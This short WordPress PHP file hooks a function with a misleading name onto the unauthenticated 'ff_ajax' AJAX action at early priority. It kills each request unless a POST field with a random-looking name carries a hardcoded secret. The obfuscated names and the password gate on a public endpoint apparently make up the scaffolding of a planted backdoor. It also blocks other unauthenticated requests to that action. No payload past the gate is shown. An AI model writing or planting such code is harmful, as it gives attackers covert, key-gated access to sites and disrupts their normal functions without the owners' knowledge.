<?php

function patterns_orders_com_read() {
	if (!isset($_POST["gynjuqaoxuzkjc"]) || $_POST["gynjuqaoxuzkjc"] !== "cKstwGuSs") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'patterns_orders_com_read', 5, 1);
